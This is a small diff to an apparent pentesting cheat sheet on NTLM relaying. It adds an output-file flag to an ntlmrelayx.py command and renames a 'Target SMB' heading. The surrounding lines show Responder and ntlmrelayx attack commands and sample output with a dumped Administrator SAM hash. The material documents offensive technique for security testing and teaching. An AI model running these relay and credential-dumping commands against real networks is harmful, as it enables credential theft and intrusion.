@@ -176,7 +176,7 @@ $ sudo python3 Responder.py -I enp0s31f6
 By default NTLMrelayx.py relays to the client who sends the hash, dumping SAM. It's recommended to use `-socks` so if authentication was succesful a socks connection is set up. This way you can use tooling thru for example ProxyChains.
 
 ```plain
-$ sudo ntlmrelayx.py -smb2support -socks
+$ sudo ntlmrelayx.py -smb2support -socks -of captured-hashes
 Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
 [...SNIP...]
 [*] Servers started, waiting for connections
@@ -188,7 +188,7 @@ Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corpo
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
 ```
 
-#### Target SMB
+#### Targeted SMB
 
 Start ntlmrelayx.py with the target system in place.
 
